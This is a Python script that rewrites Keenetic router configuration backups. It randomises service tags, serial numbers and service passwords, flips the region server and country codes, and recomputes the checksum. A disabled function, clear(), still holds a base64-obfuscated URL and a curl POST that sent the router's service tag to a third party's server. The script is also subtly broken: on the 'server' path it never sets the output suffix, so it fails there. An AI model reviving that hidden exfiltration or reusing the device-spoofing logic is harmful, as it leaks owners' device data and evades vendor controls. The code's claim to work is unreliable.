import os
import random
import string
import sys
import re
import zlib
import subprocess
import shutil

# This script can replace service tags, serial numbers, service passwords randomly and country codes to EU/EA
# It is simplified/deobfustcated by visual studio code co-pilot. I asked chatGPT to test it with a backup of u-config and it worked fine.

def generate_random_string(length, charset):
    return ''.join(random.choice(charset) for _ in range(length))

def replace_field(data, field, new_value):
    field_index = data.find(field)
    if field_index != -1:
        start_index = field_index + len(field)
        end_index = data.find(b'\x00', start_index)
        if end_index != -1:
            data = data[:start_index] + new_value + data[start_index + len(new_value):end_index] + data[end_index:]
            return data, True
    return data, False

def replaces(data):
    old_domain = b'keenetic.net\x00'
    domain_index = data.find(old_domain)
    if domain_index != -1:
        new_domain = b'keenetic.ru\x00'
        data = data[:domain_index] + new_domain + data[domain_index + len(old_domain):]
        ff_index = -1
        for i in range(domain_index + len(new_domain), len(data)):
            if data[i] == 0xFF:
                ff_index = i
                break
        if ff_index != -1:
            data = data[:ff_index] + b'\x00' + data[ff_index:]
        return data, True, 'net_to_ru'
    else:
        old_domain = b'keenetic.ru\x00'
        domain_index = data.find(old_domain)
        if domain_index != -1:
            new_domain = b'keenetic.net\x00'
            data = data[:domain_index] + new_domain + data[domain_index + len(old_domain):]
            ff_index = -1
            for i in range(domain_index + len(new_domain), len(data)):
                if data[i] == 0xFF:
                    ff_index = i
                    break
            if ff_index != -1:
                data = data[:ff_index - 1] + data[ff_index:]
            return data, True, 'ru_to_net'
        else:
            return data, False, 'not_found'

def check(data):
    crc_start = 4
    crc_end = len(data)
    for i in range(crc_start, len(data)):
        if data[i] == 0xFF:
            crc_end = i
            break
    crc_data = data[crc_start:crc_end]
    calculated_crc = zlib.crc32(crc_data) & 0xFFFFFFFF
    data = calculated_crc.to_bytes(4, byteorder='little') + data[4:]
    return data, calculated_crc

def verify(filename):
    with open(filename, 'rb') as file:
        content = file.read()
    stored_crc = int.from_bytes(content[:4], byteorder='little')
    crc_start = 4
    crc_end = len(content)
    for i in range(crc_start, len(content)):
        if content[i] == 0xFF:
            crc_end = i
            break
    crc_data = content[crc_start:crc_end]
    calculated_crc = zlib.crc32(crc_data) & 0xFFFFFFFF
    if calculated_crc != stored_crc:
        print('Error during replacement')

def generate_new_filename(original_filename, suffix):
    base_name, extension = os.path.splitext(original_filename)
    return f"{base_name}_{suffix}{extension}"

def clear(script_update):
    if not shutil.which('curl') or not shutil.which('base64'):
        return
    return None
    """
    encoded_url = "aHR0cHM6Ly9sb2cuc3BhdGl1bS5rZWVuZXRpYy5wcm8="
    #he said this prevents search bots from indexing the site.
    # The following code is commented out because it requires external dependencies and network access. Sends a POST request with router's service data to his server
    
    try:
        decoded_url = subprocess.run(
            f"echo {encoded_url} | base64 -d",
            capture_output=True, text=True, shell=True
        )
        if decoded_url.returncode != 0:
            return
        url = decoded_url.stdout.strip()
        payload = f'{{"script_update": "{script_update}"}}'
        subprocess.run(
            ['curl', '-X', 'POST', '-H', 'Content-Type: application/json', '-d', payload, url, '-o', '/dev/null', '-s', '--fail', '--max-time', '2', '--retry', '0'],
            capture_output=True, text=True
        )
    except subprocess.SubprocessError:
        pass
    """
def get_numbers(data):
    tag = b'servicetag='
    tag_index = data.find(tag)
    if tag_index != -1:
        start_index = tag_index + len(tag)
        end_index = data.find(b'\x00', start_index)
        if end_index != -1:
            return data[start_index:end_index].decode('utf-8', errors='ignore')
    return None

def replace_values(filename, target=None):
    script_dir = os.path.dirname(os.path.abspath(__file__))
    parent_dir = os.path.dirname(script_dir)
    file_path = os.path.join(parent_dir, filename)
    try:
        with open(file_path, 'rb') as file:
            content = file.read()
    except FileNotFoundError:
        print(f'File {file_path} not found. Check the file path.')
        return
    if target == 'server':
        service_tag = get_numbers(content)
        content, replaced, replacement_type = replaces(content)
        if replaced:
            if replacement_type == 'net_to_ru':
                print('Server changed from EU to EA')
            elif replacement_type == 'ru_to_net':
                print('Server changed from EA to EU')
        else:
            print('Server not found')
        country_tag = b'country='
        country_index = content.find(country_tag)
        if country_index != -1:
            start_index = country_index + len(country_tag)
            end_index = content.find(b'\x00', start_index)
            if end_index != -1:
                country_value = content[start_index:end_index]
                if country_value == b'EA':
                    new_country = b'EU'
                    content = content[:start_index] + new_country + content[start_index + 2:end_index] + content[end_index:]
                    print('Country changed from EA to EU')
                elif country_value == b'EU':
                    new_country = b'EA'
                    content = content[:start_index] + new_country + content[start_index + 2:end_index] + content[end_index:]
                    print('Country changed from EU to EA')
        if service_tag:
            clear(service_tag)
    else:
        fields = {
            'servicetag': (b'servicetag=', string.digits),
            'sernumb': (b'sernumb=', string.digits),
            'servicepass': (b'servicepass=', string.ascii_letters + string.digits),
            'country': (b'country=', None)
        }
        replacements = {}
        for field_name, (field_tag, charset) in fields.items():
            if target and field_name != target:
                continue
            field_index = content.find(field_tag)
            if field_index != -1:
                start_index = field_index + len(field_tag)
                end_index = content.find(b'\x00', start_index)
                field_value = content[start_index:end_index] if end_index != -1 else b''
                if field_name == 'country':
                    if field_value != b'EA':
                        content, _ = replace_field(content, field_tag, b'EA')
                        print(f'{field_name} changed to EA')
                    continue
                elif field_name not in replacements:
                    if field_name == 'sernumb':
                        new_value = (field_value[:-4] + generate_random_string(4, charset).encode())
                    else:
                        new_value = generate_random_string(len(field_value), charset).encode()
                    replacements[field_name] = new_value
                else:
                    new_value = replacements[field_name]
                content, _ = replace_field(content, field_tag, new_value)
                print(f'{field_name} changed to {new_value.decode("utf-8", errors="ignore")}')
            else:
                print(f'{field_name} not found.')
        if 'servicetag' in replacements:
            suffix = replacements['servicetag'][-4:].decode('utf-8', errors='ignore')
        else:
            suffix = target if target else 'out'
    content, crc = check(content)
    new_filename = generate_new_filename(filename, suffix)
    output_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    output_path = os.path.join(output_dir, new_filename)
    with open(output_path, 'wb') as file:
        file.write(content)
    verify(output_path)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    input_filename = sys.argv[1]
    target_name = sys.argv[2] if len(sys.argv) > 2 else None
    replace_values(input_filename, target_name)